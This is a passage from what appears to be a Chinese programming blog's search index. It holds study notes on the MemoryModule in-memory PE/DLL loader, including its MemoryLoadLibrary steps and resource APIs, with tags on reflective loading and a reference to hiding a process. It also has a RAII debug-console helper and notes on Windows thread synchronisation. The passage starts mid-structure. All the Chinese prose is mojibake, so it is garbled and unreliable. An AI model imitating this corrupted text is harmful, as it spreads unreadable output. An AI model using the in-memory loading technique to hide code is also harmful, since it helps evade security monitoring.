CustomGetProcAddressFunc getProcAddress; CustomFreeLibraryFunc freeLibrary; struct ExportNameEntry* nameExportsTable; void* userdata; ExeEntryProc exeEntry; DWORD pageSize;#ifdef _WIN64 POINTER_LIST* blockedMemory;#endif&#125; MEMORYMODULE, * PMEMORYMODULE; æ ¸å¿ƒä»£ç éƒ¨åˆ†ï¼ˆMemoryLoadLibraryï¼‰ 1234HMEMORYMODULE MemoryLoadLibrary( const void* data, //PEæ–‡ä»¶æ•°æ®æŒ‡é’ˆ size_t size //PEæ–‡ä»¶æ•°æ®çš„å¤§å°ï¼Œsizeç”¨äºå‡½æ•°å†…éƒ¨åšå¤§å°æ£€éªŒç”¨) MemoryLoadLibraryå‡½æ•°ä¸­ä¸»è¦æµç¨‹1234567891011121314MemoryLoadLibrary //ä¸€äº›å¤§å°ï¼Œå­—æ®µï¼Œå¯¹é½å€¼å€æ•°ç­‰çš„æ£€æŸ¥ //è·å–å½“å‰ç³»ç»Ÿé¡µçš„å¤§å°ï¼Œç®—å¯¹é½ç”¨ allocMemory //å°è¯•æŒ‰PEæ–‡ä»¶çš„ImageBaseç”³è¯·ç©ºé—´ï¼›ç”³è¯·å¤±è´¥å°±éšæœºç”³è¯·åœ°å€ HeapAlloc //ç”¨HeapAllocç”³è¯·MEMORYMODULEç»“æ„ä½“å¤§å°çš„å†…å­˜ç©ºé—´ï¼Œå¡«å……ç›¸å…³å­—æ®µ //æ‹·è´å¤´éƒ¨SizeOfHeadersï¼Œå°†å®é™…ç”³è¯·åˆ°çš„åŸºå€æ›´æ–°ImageBaseï¼›æ‹·è´åŒºæ®µCopySections PerformBaseRelocation //ä¿®å¤é‡å®šä½æ•°æ® BuildImportTable //ä¿®æ­£IATè¡¨ FinalizeSections //å¤„ç†PEåŠ è½½åå¯ä»¥ä¸¢å¼ƒçš„åŒºå—ï¼Œå¤„ç†åŒºå—ä¸­ä¸ç”¨ç»è¿‡ç¼“å­˜çš„æ•°æ®ï¼ˆèŠ‚å±æ€§ä¸ºIMAGE_SCN_MEM_NOT_PAGEDï¼‰ ExecuteTLS //æ‰§è¡ŒTLSå›è°ƒå‡½æ•° //æŒ‡å‘PEå…¥å£ //ï¼ˆ1ï¼‰å¦‚æœè¯¥PEæ˜¯dllï¼Œä»¥DLL_PROCESS_ATTACHè°ƒç”¨dllmain // (2) å¦‚æœè¯¥PEæ˜¯exeï¼ŒæŒ‡å‘mainå‡½æ•°å…¥å£ï¼ˆæ²¡è°ƒç”¨ï¼‰ //è¿”å›HMEMORYMODULEï¼Œä¾›åç»­ä½¿ç”¨ é€šè¿‡HMEMORYMODULEä½¿ç”¨è¿™ä¸ªå†…å­˜æ¨¡å— è°ƒç”¨MemoryLoadLibraryæˆåŠŸåï¼Œå¾—åˆ°HMEMORYMODULEï¼Œé€šè¿‡å®ƒæ¥ä½¿ç”¨è¿™ä¸ªå†…å­˜æ¨¡å—ã€‚è¯¥é¡¹ç›®ä¸­æä¾›äº†å¦‚ä¸‹å‡½æ•°è¿›è¡Œä½¿ç”¨ å†…å­˜æ¨¡å—æ˜¯exe1int MemoryCallEntryPoint(HMEMORYMODULE); //å¦‚æœè¯¥å†…å­˜æ¨¡å—æ˜¯exeï¼Œè°ƒç”¨exeçš„mainå‡½æ•° è‡ªå®ç°çš„GetProcAddressï¼Œè·å–è¯¥MEMORYMODULEä¸­å¯¼å‡ºè¡¨çš„å‡½æ•°ï¼Œæ”¯æŒåºå·å’Œåå­—æŸ¥è¯¢1FARPROC MemoryGetProcAddress(HMEMORYMODULE, LPCSTR); èµ„æºç›¸å…³çš„1234567891011121314151617181920212223242526272829/** * Find the location of a resource with the specified type and name. */HMEMORYRSRC MemoryFindResource(HMEMORYMODULE, LPCTSTR, LPCTSTR);/** * Find the location of a resource with the specified type, name and language. */HMEMORYRSRC MemoryFindResourceEx(HMEMORYMODULE, LPCTSTR, LPCTSTR, WORD);/** * Get the size of the resource in bytes. */DWORD MemorySizeofResource(HMEMORYMODULE, HMEMORYRSRC);/** * Get a pointer to the contents of the resource. */LPVOID MemoryLoadResource(HMEMORYMODULE, HMEMORYRSRC);/** * Load a string resource. */int MemoryLoadString(HMEMORYMODULE, UINT, LPTSTR, int);/** * Load a string resource with a given language. */int MemoryLoadStringEx(HMEMORYMODULE, UINT, LPTSTR, int, WORD); ä½¿ç”¨MemoryModule å°†PEæ–‡ä»¶çš„lpFileBufferå’Œå¤§å°ä¼ ç»™MemoryLoadLibraryè¿›è¡Œå†…å­˜åŠ è½½ å¦‚æœæ˜¯dllï¼Œå†…å­˜åŠ è½½åï¼Œé€šè¿‡MemoryGetProcAddress + å‡½æ•°æŒ‡é’ˆçš„æ–¹å¼æ¥ä½¿ç”¨å¯¼å‡ºè¡¨ä¸­çš„å‡½æ•° å¦‚æœæ˜¯exeï¼Œå†…å­˜åŠ è½½åï¼Œé€šè¿‡MemoryCallEntryPointè°ƒç”¨mainå‡½æ•° å…¶ä»–æ–¹é¢çš„å­¦ä¹  MemoryLoadLibraryå‡½æ•°ä¸­å¯¹äºèµ„æºçš„æ¸…ç†ä½¿ç”¨äº†gotoè¯­å¥ï¼Œä¸­é€”å‡ºé”™åˆ™gotoåˆ°æœ«å°¾çš„errorè¿›è¡Œèµ„æºçš„ç»Ÿä¸€é‡Šæ”¾ 123error: // cleanup MemoryFreeLibrary(result); å‚è€ƒèµ„æº é“¾æ¥ğŸ”— å¤‡æ³¨ MemoryModule x86x64 å†…å­˜åŠ è½½DLL è¿˜æ²¡çœ‹ï¼Œæœ‰ä¸œè¥¿å¯ä¾›åç»­æ·±å…¥å­¦ä¹  æ‰‹å·¥æ¨¡æ‹ŸPEåŠ è½½å™¨ ä»£ç ç¼–å†™æ—¶å‚è€ƒäº†é£å¸ˆå‚…çš„è¿™ç¯‡æ–‡ç«  Loading a DLL from memory MemoryModuleé¡¹ç›®åŸç†è¯´æ˜ï¼Œå…¶å®å†™å¾—å¾ˆè¯¦ç»†äº† Writing a Windows Loader (Part 1) å‰è¨€éƒ¨åˆ†å‚è€ƒäº†è¿™ä¸ªç½‘ç«™ ä¸‹é¢è¿™äº›æ˜¯ç¬”è€…å®ç°åä¸Šç½‘å†æ¬¡æœå¯»èµ„æ–™å‘ç°çš„ï¼Œå¯¹ä½ å¯èƒ½æœ‰ç”¨ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹ é“¾æ¥ğŸ”— å¤‡æ³¨ windowsï¼š3ç¯è‡ªè¡ŒåŠ è½½PEæ–‡ä»¶å®ç°è¿›ç¨‹éšè— PEåŠ è½½å™¨çš„ç®€å•å®ç° PeLoader å¯ä»¥å‚è€ƒï¼šè¿‡ç¨‹ä¸­åŠ ä¸€äº›æ‰“å°è¾“å‡ºï¼Œæ–¹ä¾¿è§‚å¯Ÿ æ›´å¤šèµ„æ–™ï¼Œæœç´¢å¼•æ“æœå¦‚ä¸‹å…³é”®è¯ PEåŠ è½½å™¨ PEè£…é…å™¨ PE Loader","tags":["å†…å­˜åŠ è½½æŠ€æœ¯","PEåŠ è½½å™¨ï¼ˆPE Loaderï¼‰","åå°„å¼åŠ è½½ï¼ˆReflective Loaderï¼‰"],"categories":["å®‰å…¨æŠ€æœ¯","PEæ–‡ä»¶æ ¼å¼"]},{"title":"åœ¨Windowsçª—å£ç¨‹åºä¸­æ–°å»ºä¸€ä¸ªç”¨äºè¾“å‡ºè°ƒè¯•ä¿¡æ¯çš„æ§åˆ¶å°","path":"/posts/e1c55744.html","content":"å‰è¨€ åœ¨Windowsåº”ç”¨ç¨‹åºå¼€å‘ä¸­ï¼Œå…¥å£å‡½æ•°å˜ä¸ºäº†WinMainï¼Œä¹‹å‰å†™æ§åˆ¶å°ç¨‹åºæ—¶çš„é‚£ä¸ªcmdçª—å£æ²¡æœ‰äº†ï¼Œå°±ä¸æ–¹ä¾¿æ‰“å°ä¸€äº›è°ƒè¯•ä¿¡æ¯ã€‚æ­¤æ—¶ï¼Œå¯ä»¥ä½¿ç”¨AllocConsole()åˆ›å»ºä¸€ä¸ªcmdçª—å£ï¼Œç„¶åå°±èƒ½æ„‰å¿«åœ°ä½¿ç”¨printfæˆ–std::coutè¿›è¡Œè°ƒè¯•ä¿¡æ¯çš„æ‰“å°è¾“å‡ºã€‚ ç›¸å…³API 1234567891011FILE* m_stream = nullptr; // æ–‡ä»¶æŒ‡é’ˆï¼Œç”¨äºé‡å®šå‘æ ‡å‡†è¾“å‡ºAllocConsole(); // åˆ†é…ä¸€ä¸ªæ–°çš„æ§åˆ¶å°çª—å£freopen_s(&amp;m_stream, &quot;CONOUT$&quot;, &quot;w&quot;, stdout); // å°†æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°æ–°çš„æ§åˆ¶å°//freopen(&quot;CONOUT$&quot;, &quot;w&quot;, stdout); // ä¸å®‰å…¨ç‰ˆæœ¬çš„ freopen//ä½¿ç”¨printf(&quot;Debug console initialized. &quot;); // ä½¿ç”¨æ ‡å‡†è¾“å‡ºæµæ‰“å°è°ƒè¯•ä¿¡æ¯std::cout &lt;&lt; &quot;Debug console initialized.&quot; &lt;&lt; std::endl; // ä½¿ç”¨æ ‡å‡†è¾“å‡ºæµæ‰“å°è°ƒè¯•ä¿¡æ¯fclose(m_stream); // å…³é—­æ–‡ä»¶æµFreeConsole(); // é‡Šæ”¾æ§åˆ¶å° RAIIç‰ˆ ä¸ºäº†æ›´æ–¹ä¾¿åœ°ç®¡ç†æ§åˆ¶å°çš„åˆ›å»ºå’Œé”€æ¯ï¼Œå°è£…æˆRAIIç±» DebugConsole.h1234567891011121314151617181920212223242526272829303132#pragma once#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#define ENABLE_DEBUG_CONSOLE 1 // å®å®šä¹‰ï¼Œç”¨äºæ§åˆ¶æ˜¯å¦å¯ç”¨è°ƒè¯•æ§åˆ¶å°class DebugConsole&#123;public: DebugConsole() &#123;#if ENABLE_DEBUG_CONSOLE AllocConsole(); // åˆ†é…ä¸€ä¸ªæ–°çš„æ§åˆ¶å°çª—å£ freopen_s(&amp;m_stream, &quot;CONOUT$&quot;, &quot;w&quot;, stdout); // å°†æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°æ–°çš„æ§åˆ¶å° //freopen(&quot;CONOUT$&quot;, &quot;w&quot;, stdout); // ä¸å®‰å…¨ç‰ˆæœ¬çš„ freopen //printf(&quot;Debug console initialized. &quot;); // ä½¿ç”¨æ ‡å‡†è¾“å‡ºæµæ‰“å°è°ƒè¯•ä¿¡æ¯ //std::cout &lt;&lt; &quot;Debug console initialized.&quot; &lt;&lt; std::endl; // ä½¿ç”¨æ ‡å‡†è¾“å‡ºæµæ‰“å°è°ƒè¯•ä¿¡æ¯#endif &#125; ~DebugConsole() &#123;#if ENABLE_DEBUG_CONSOLE fclose(m_stream); // å…³é—­æ–‡ä»¶æµ FreeConsole(); // é‡Šæ”¾æ§åˆ¶å°#endif &#125;private: FILE* m_stream = nullptr; // æ–‡ä»¶æŒ‡é’ˆï¼Œç”¨äºé‡å®šå‘æ ‡å‡†è¾“å‡º&#125;; ä¾‹ main.cpp123456789101112131415161718#include &lt;Windows.h&gt;#include &quot;DebugConsole.h&quot;int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) &#123;#if ENABLE_DEBUG_CONSOLE DebugConsole debugConsole;#endif //ä½¿ç”¨ printf(&quot;This is a debug message. &quot;); //std::cout &lt;&lt; &quot;This is another debug message.&quot; &lt;&lt; std::endl; // å…¶ä»–ä»£ç ... MessageBox(NULL, &quot;Hello, Windows!&quot;, &quot;WinMain&quot;, MB_OK); return 0;&#125;","tags":["ç¼–ç¨‹å°æŠ€å·§"],"categories":["ç³»ç»Ÿç¼–ç¨‹","Windows APIç¼–ç¨‹"]},{"title":"çº¿ç¨‹åŒæ­¥ä¸çº¿ç¨‹äº’æ–¥","path":"/posts/df83ab2b.html","content":"å‰è¨€ wikiä¸­Windows APIé‡Œçº¿ç¨‹ç¯‡ä¸­å¯¹å„ç§ç›¸å…³å¯¹è±¡å†™çš„ç¬”è®°ä¸å¤Ÿç®€ç»ƒã€‚è¿™ç¯‡æ–°æ–‡ç« ï¼Œå°±æ˜¯å¯¹Windowsä¸´ç•ŒåŒºã€äº’æ–¥ä½“ã€äº‹ä»¶å’Œä¿¡å·é‡å¯¹è±¡çš„æ€»ç»“å’Œæ¢³ç†ï¼ŒåŒæ—¶ä¼šæ›´ç»“æ„åŒ–åœ°è®²è§£çº¿ç¨‹åŒæ­¥å’Œçº¿ç¨‹äº’æ–¥ã€‚ Wait Functions ç­‰å¾…å‡½æ•°(Wait Functions)æœ‰ä¸¤ä¸ªï¼ŒWaitForSingleObjectå’ŒWaitForMultipleObjectsã€‚WaitForSingleObjectç”¨äºç­‰å¾…å•ä¸ªå†…æ ¸å¯¹è±¡ï¼ŒWaitForMultipleObjectsç”¨äºç­‰å¾…å¤šä¸ªå†…æ ¸å¯¹è±¡ã€‚ å¯¹äºä¸åŒçš„å†…æ ¸å¯¹è±¡ï¼Œå¾®è½¯éƒ½ç»Ÿä¸€æŠ½è±¡æˆäº†ä¸¤ç§çŠ¶æ€ï¼š signaled stateï¼šæœ‰ä¿¡å·/æˆä¿¡çŠ¶æ€/å·²é€šçŸ¥çŠ¶æ€/è§¦å‘æ€ non signaled stateï¼šæ— ä¿¡å·/æ— çŠ¶æ€/æœªé€šçŸ¥çŠ¶æ€/éè§¦å‘æ€ WaitForSingleObject ç­‰å¾…ä¸€ä¸ªå†…æ ¸å¯¹è±¡å˜æˆå·²é€šçŸ¥çŠ¶æ€ï¼ˆin the signaled stateï¼‰æˆ–ç­‰çš„æ—¶é—´ç­‰å¤Ÿäº†å°±ç»“æŸç­‰å¾…ã€‚ 1234DWORD WaitForSingleObject( [in] HANDLE hHandle, // handle to object å¥æŸ„ [in] DWORD dwMilliseconds // time-out interval ç­‰å¾…è¶…æ—¶æ—¶é—´ï¼ˆæ¯«ç§’ï¼‰); è¿”å›å€¼ å‡½æ•°è°ƒç”¨æˆåŠŸï¼š WAIT_OBJECT_0ï¼Œè¡¨ç¤ºæˆåŠŸâ€œç­‰å¾…â€åˆ°è®¾ç½®çš„å¯¹è±¡ WAIT_TIMEOUTï¼Œç­‰å¾…è¶…æ—¶ WAIT_ABANDONEDï¼Œå½“ç­‰å¾…çš„å¯¹è±¡æ˜¯Mutexç±»å‹æ—¶ï¼Œå¦‚æœæŒæœ‰è¯¥Mutexå¯¹è±¡çš„çº¿ç¨‹å·²ç»ç»“æŸï¼Œä½†æ˜¯æ²¡æœ‰åœ¨ç»“æŸå‰é‡Šæ”¾è¯¥Mutexï¼Œæ­¤æ—¶è¯¥Mutexå·²ç»å¤„äºåºŸå¼ƒçŠ¶æ€ï¼Œå…¶è¡Œä¸ºæ˜¯æœªçŸ¥çš„ï¼Œä¸å»ºè®®å†ä½¿ç”¨è¯¥Mutex å‡½æ•°è°ƒç”¨å¤±è´¥ï¼š è¿”å›å€¼ä¸ºWAIT_FAILEDï¼Œè°ƒGetLaseErrorå¾—åˆ°å…·ä½“é”™è¯¯ç  WaitForMultipleObjects ç­‰å¾…å¤šä¸ªå†…æ ¸å¯¹è±¡orä»»ä¸€å†…æ ¸å¯¹è±¡å˜æˆå·²é€šçŸ¥çŠ¶æ€ï¼ˆin the signaled stateï¼‰æˆ–ç­‰çš„æ—¶é—´ç­‰å¤Ÿäº†å°±ç»“æŸç­‰å¾…ã€‚ 12345DWORD WaitForMultipleObjects( [in] DWORD nCount, // number of handles in array å†…æ ¸å¯¹è±¡çš„æ•°é‡ [in] const HANDLE *lpHandles, // object-handle array å†…æ ¸å¯¹è±¡çš„å¥æŸ„æ•°ç»„ [in] BOOL bWaitAll, // wait option ç­‰å¾…æ¨¡å¼ï¼Œç­‰å¾…æ‰€æœ‰å†…æ ¸å¯¹è±¡è¿˜æ˜¯ç­‰å¾…ä»»ä¸€å¯¹è±¡ [in] DWORD dwMilliseconds // time-out interval ç­‰å¾…è¶…æ—¶æ—¶é—´ï¼ˆæ¯«ç§’ï¼‰ å‚æ•°bWaitAll TRUEï¼šç­‰å¾…æ‰€æœ‰å¯¹è±¡çš„çŠ¶æ€å‘ç”Ÿå˜æ›´ FALSEï¼šç­‰å¾…ä»»ä¸€å¯¹è±¡çš„çŠ¶æ€å‘ç”Ÿå˜æ›´ å’Œä¸Šé¢ç­‰å¾…ä¸€ä¸ªå†…æ ¸å¯¹è±¡çš„ä¸€æ ·ï¼Œåªä¸è¿‡è¡¨ç¤ºWAIT_OBJECT_0å’ŒWAIT_ABANDONEDå«ä¹‰æ—¶ä¼šå¤šåŠ ä¸ŠnCount-1ï¼ŒnCount-1ç”¨äºè¡¨ç¤ºå†…æ ¸å¯¹è±¡æ•°ç»„ä¸­çš„å“ªä¸€ä¸ªã€‚ è¿”å›å€¼åœ¨å‚æ•°bWaitAllè®¾ç½®ä¸º FALSE çš„æƒ…å†µä¸‹ï¼ˆå³ç­‰å¾…ä»»ä¸€å¯¹è±¡çš„çŠ¶æ€å‘ç”Ÿå˜æ›´ï¼‰å‡½æ•°è°ƒç”¨æˆåŠŸï¼šWAIT_TIMEOUTï¼Œç­‰å¾…è¶…æ—¶WAIT_OBJECT_0 ï½ (WAIT_OBJECT_0 + nCountâ€“ 1)**ï¼Œè¡¨ç¤ºæˆåŠŸâ€œç­‰å¾…â€åˆ°è®¾ç½®çš„å¯¹è±¡é€šè¿‡nCountâ€“ 1å¯ä»¥çŸ¥é“æ˜¯ç­‰å¾…å¯¹è±¡æ•°ç»„ä¸­å“ªä¸ªå¯¹è±¡çŠ¶æ€å‘ç”Ÿäº†æ”¹å˜ä¸¾ä¸ªä¾‹å­ï¼Œå‡è®¾ç°åœ¨ç­‰å¾…ä¸‰ä¸ªå¯¹è±¡A1ã€A2ã€A3ï¼Œå®ƒä»¬åœ¨æ•°ç»„lpHandlesä¸­çš„ä¸‹æ ‡ä¾æ¬¡æ˜¯0ã€1ã€2ï¼ŒæŸæ¬¡WaitForMultipleObjectsè¿”å›å€¼æ˜¯ Wait_OBJECT_0 + 1ï¼Œåˆ™è¡¨ç¤ºå¯¹è±¡A2æœ‰ä¿¡å·ï¼Œå¯¼è‡´WaitForMultipleObjectsè°ƒç”¨æˆåŠŸè¿”å›ã€‚123456789101112131415161718192021222324HANDLE waitHandles[3];waitHandles[0] = hA1Handle;waitHandles[1] = hA2Handle;waitHandles[2] = hA3Handle;DWORD dwResult = WaitForMultipleObjects(3, waitHandles, FALSE, 3000);switch(dwResult)&#123; case WAIT_OBJECT_0 + 0: //A1 æœ‰ä¿¡å· break; case WAIT_OBJECT_0 + 1: //A2 æœ‰ä¿¡å· break; case WAIT_OBJECT_0 + 2: //A3 æœ‰ä¿¡å· break; default: //å‡ºé”™æˆ–è¶…æ—¶ break;&#125;WAIT_ABANDONED_0 ï½ (WAIT_ABANDONED_0 + nCountâ€“ 1)ï¼Œå½“ç­‰å¾…çš„å¯¹è±¡æ˜¯Mutexç±»å‹æ—¶ï¼Œå¦‚æœæŒæœ‰è¯¥Mutexå¯¹è±¡çš„çº¿ç¨‹å·²ç»ç»“æŸï¼Œä½†æ˜¯æ²¡æœ‰åœ¨ç»“æŸå‰é‡Šæ”¾è¯¥Mutexï¼Œæ­¤æ—¶è¯¥Mutexå·²ç»å¤„äºåºŸå¼ƒçŠ¶æ€ï¼Œå…¶è¡Œä¸ºæ˜¯æœªçŸ¥çš„ï¼Œä¸å»ºè®®å†ä½¿ç”¨è¯¥Mutexã€‚é€šè¿‡nCount - 1å¯ä»¥çŸ¥é“æ˜¯ç­‰å¾…å¯¹è±¡æ•°ç»„ä¸­å“ªä¸ªå¯¹è±¡å§‹ç»ˆæ²¡æœ‰è¢«å…¶ä»–çº¿ç¨‹é‡Šæ”¾ä½¿ç”¨æƒå‡½æ•°è°ƒç”¨å¤±è´¥ï¼šè¿”å›å€¼ä¸ºWAIT_FAILEDï¼Œè°ƒGetLaseErrorå¾—åˆ°å…·ä½“é”™è¯¯ç  ç­‰å¾…çš„å«ä¹‰ å¯¹äºä¸åŒçš„å†…æ ¸å¯¹è±¡ï¼Œè¿™ä¸ªç­‰å¾…çš„å«ä¹‰æ˜¯ä¸ä¸€æ ·çš„ï¼Œè¦å…³æ³¨çš„æ˜¯ï¼š ç­‰å¾…çš„å«ä¹‰ ç­‰å¾…åˆ°äº†ä¹‹åï¼Œæ˜¯å¦ä¼šä¿®æ”¹åˆ°ç­‰å¾…å†…æ ¸å¯¹è±¡çš„çŠ¶æ€ å¯ä»¥è¢«ç­‰å¾…çš„å¯¹è±¡ ç­‰å¾…å¯¹è±¡æˆåŠŸçš„å«ä¹‰ æ˜¯å¦ä¼šä¿®æ”¹åˆ°ç­‰å¾…å†…æ ¸å¯¹è±¡çš„çŠ¶æ€ çº¿ç¨‹(Thread) ç­‰å¾…çº¿ç¨‹ç»“æŸ ä¸ä¼šï¼Œçº¿ç¨‹ç»“æŸåçŠ¶æ€è‡ªç„¶å˜åŒ– è¿›ç¨‹(Process) ç­‰å¾…è¿›ç¨‹ç»“æŸ ä¸ä¼šï¼Œè¿›ç¨‹ç»“æŸåçŠ¶æ€è‡ªç„¶å˜åŒ– äº‹ä»¶(Event) ç­‰å¾…Eventæœ‰ä¿¡å· å¦‚æœæ˜¯è‡ªåŠ¨é‡ç½®äº‹ä»¶ï¼Œç­‰å¾…å‡½æ•°è¿”å›æ—¶ï¼ŒçŠ¶æ€å°†è‡ªåŠ¨é‡ç½®ä¸ºæ— ä¿¡å·å¦‚æœæ˜¯æ‰‹åŠ¨é‡ç½®äº‹ä»¶ï¼ŒçŠ¶æ€ä¸ä¼šè‡ªåŠ¨æ”¹å˜ï¼Œéœ€è¦æ‰‹åŠ¨é‡ç½®ï¼ˆæ‰‹åŠ¨è°ƒç”¨ResetEventï¼‰ äº’æ–¥ä½“(Mutex) ç­‰å¾…æŒæœ‰Mutexçš„çº¿ç¨‹é‡Šæ”¾è¯¥Mutexï¼Œç­‰å¾…æˆåŠŸåæ‹¥æœ‰è¯¥Mutex ä¼šï¼Œè°ƒç”¨çº¿ç¨‹è·å–Mutexåå…¶çŠ¶æ€ä¼šå˜ä¸ºæ— ä¿¡å· ä¿¡å·é‡(Semaphore) ç­‰å¾…è¯¥ Semaphore å¯¹è±¡æœ‰ä¿¡å· ä¼šï¼Œè°ƒç”¨WaitForSingleObjectä¼šä½¿ä¿¡å·é‡çš„è®¡æ•°å‡ä¸€ ä¸´ç•ŒåŒºï¼ˆCritical Sectionï¼‰å¯¹è±¡ åˆ›å»ºå…¨å±€å˜é‡ï¼šCRITICAL_SECTION cs; åˆå§‹åŒ–å…¨å±€å˜é‡ï¼šInitializeCriticalSection(&amp;cs); å®ç°ä¸´ç•ŒåŒº 123EnterCriticalSection(&amp;cs); //è¿›å…¥ä¸´ç•ŒåŒº//ä½¿ç”¨ä¸´ç•Œèµ„æºLeaveCriticalSection(&amp;cs); //ç¦»å¼€ä¸´ç•ŒåŒº ç›¸å…³å‡½æ•°12345678910void InitializeCriticalSection(LPCRITICAL_SECTION lpCriticalSection);// åˆå§‹åŒ–ä¸´ç•ŒåŒºå¯¹è±¡èµ„æº void EnterCriticalSection(LPCRITICAL_SECTION lpCriticalSection); // è¿›å…¥ä¸´ç•ŒåŒº //...ä½¿ç”¨ä¸´ç•ŒåŒºèµ„æºvoid LeaveCriticalSection(LPCRITICAL_SECTION lpCriticalSection); // ç¦»å¼€ä¸´ç•ŒåŒº void DeleteCriticalSection(LPCRITICAL_SECTION lpCriticalSection); // åˆ é™¤ä¸´ç•ŒåŒºå¯¹è±¡èµ„æº ä½¿ç”¨ä¸´ç•ŒåŒºé”çš„æ³¨æ„äº‹é¡¹ å°†ä¸´ç•ŒåŒºåªåŒ…è£¹ä½å®é™…éœ€è¦ä¿æŠ¤çš„ä¸´ç•Œèµ„æºæ“ä½œã€‚å¦‚æœåŒ…è£¹äº†å…¶ä»–æ— ç”¨ä»£ç ä¼šå¯¼è‡´ç¨‹åºæ•ˆç‡ä½ä¸‹ã€‚ å‡ ä¸ªä¸´ç•Œèµ„æºï¼Œå°±ç”¨å‡ ä¸ªä¸´ç•ŒåŒºé”ã€‚ äº’æ–¥ä½“ï¼ˆMutexï¼‰å¯¹è±¡ åˆ›å»ºä¸€ä¸ªMutexå¯¹è±¡12345HANDLE CreateMutexA(\t[in, optional] LPSECURITY_ATTRIBUTES lpMutexAttributes, // SD å®‰å…¨å±æ€§ï¼ŒåŒ…å«å®‰å…¨æè¿°ç¬¦\t[in] BOOL bInitialOwner, // initial owner åˆ›å»ºè€…æ˜¯å¦æ˜¯è¯¥Mutexå¯¹è±¡çš„æ‹¥æœ‰è€…\t[in, optional] LPCSTR lpName // mutex object name äº’æ–¥ä½“çš„åå­—); å‚æ•°bInitialOwnerï¼Œåˆ›å»ºè¯¥Mutexå¯¹è±¡çš„çº¿ç¨‹æ˜¯å¦ç«‹å³æ‹¥æœ‰è¯¥Mutexå¯¹è±¡ TRUEï¼šæ‹¥æœ‰ FALSEï¼šä¸æ‹¥æœ‰ äº’æ–¥ä½“å¯¹è±¡æœ‰æ‹¥æœ‰è€…çš„æ¦‚å¿µï¼š äº’æ–¥ä½“å¯¹è±¡çŠ¶æ€ä¸ºå¯ç”¨ï¼ˆsignaled stateï¼‰æ—¶ï¼Œçº¿ç¨‹èƒ½å¤Ÿé€šè¿‡WaitForSingleObjectç­‰å¾…è¯·æ±‚è·å¾—è¯¥Mutexå¯¹è±¡ï¼Œè·å¾—åä¼šå°†äº’æ–¥ä½“å¯¹è±¡çŠ¶æ€æ”¹ä¸ºä¸å¯ç”¨ï¼ˆnon signaled stateï¼‰ å½“ä¸€ä¸ªäº’æ–¥ä½“å¯¹è±¡è¢«çº¿ç¨‹æ‹¥æœ‰åï¼Œå…¶ä»–çº¿ç¨‹è°ƒç”¨WaitForSingleObjectç­‰å¾…è¯·æ±‚ä¼šè¢«é˜»å¡ ç›´è‡³æ‹¥æœ‰äº’æ–¥ä½“å¯¹è±¡çš„çº¿ç¨‹è°ƒç”¨ReleaseMutexé‡Šæ”¾æ‰äº’æ–¥ä½“å¯¹è±¡ï¼Œè®©äº’æ–¥ä½“å¯¹è±¡å¯ç”¨ï¼ˆsignaled stateï¼‰ æˆ–æ‹¥æœ‰è€…çº¿ç¨‹åœ¨é€€å‡ºæ—¶æ²¡æœ‰é‡Šæ”¾å…¶æŒæœ‰çš„Mutexå¯¹è±¡ï¼Œè¿™æ—¶WaitForSingleObjectè°ƒç”¨è¿”å›WAIT_ABANDONEDï¼Œè¡¨ç¤ºè¿™ä¸ªMutexå¤„äºåºŸå¼ƒçŠ¶æ€ï¼ˆabandonedï¼‰ï¼Œå…¶è¡Œä¸ºæ˜¯æœªçŸ¥çš„ï¼Œä¸å»ºè®®å†ä½¿ç”¨è¯¥Mutex é‡Šæ”¾Mutexå¯¹è±¡è®©å…¶å¯ç”¨123BOOL ReleaseMutex(\tHANDLE hMutex // handle to mutex); çº¿ç¨‹äº’æ–¥ å½“å¤šä¸ªçº¿ç¨‹éœ€è¦è®¿é—®åŒä¸€ä¸ªä¸´ç•Œèµ„æºæ—¶ï¼Œä¾‹å¦‚åŒæ—¶éƒ½è¦å†™ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œå°±éœ€è¦è¿›è¡Œäº’æ–¥æ§åˆ¶ã€‚ ä¸´ç•Œèµ„æºï¼šä¸€æ¬¡åªå…è®¸ä¸€ä¸ªçº¿ç¨‹ä½¿ç”¨çš„èµ„æº ä¸´ç•ŒåŒºï¼šè®¿é—®ä¸´ç•Œèµ„æºçš„é‚£éƒ¨åˆ†ä»£ç ï¼Œç§°ä¸ºä¸´ç•ŒåŒºä»£ç  ä½“ä¼šè¿™é‡Œçš„æ€æƒ³ï¼šåŸæœ¬æ˜¯è¦æ§åˆ¶ä¸´ç•Œèµ„æºï¼Œç°åœ¨è½¬ä¸ºæ§åˆ¶è®¿é—®ä¸´ç•Œèµ„æºçš„ä»£ç éƒ¨åˆ†ï¼ˆå³ä¸´ç•ŒåŒºä»£ç ï¼‰ã€‚ å°†éœ€è¦æ§åˆ¶çš„èµ„æºè½¬æ¢ä¸ºç¨‹åºå‘˜å¯æ§çš„ä»£ç éƒ¨åˆ†ï¼Œå³ä¸´ç•Œèµ„æº -&gt; ä¸´ç•ŒåŒºä»£ç ã€‚ äº’æ–¥æ§åˆ¶çš„ç›®çš„æ˜¯åœ¨æŸä¸€æ—¶åˆ»åªå…è®¸ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œä¸´ç•ŒåŒºä»£ç ã€‚äº’æ–¥æ§åˆ¶çš„åŠæ³•ä¹‹ä¸€æ˜¯é€šè¿‡â€œä»¤ç‰Œâ€æ¥è§£å†³ï¼Œåªæœ‰æ‹¿åˆ°â€œä»¤ç‰Œâ€çš„çº¿ç¨‹æ‰èƒ½è¿›ä¸´ç•ŒåŒºï¼Œåœ¨æ²¡æœ‰å½’è¿˜â€œä»¤ç‰Œâ€ä¹‹å‰ï¼Œå…¶ä»–çº¿ç¨‹ä¸èƒ½è¿›ä¸´ç•ŒåŒºã€‚ä¸Šè¿°çš„ä¸´ç•ŒåŒºé”å’Œäº’æ–¥ä½“é”éƒ½èƒ½å®ç°è¿™ç§æ§åˆ¶ã€‚ 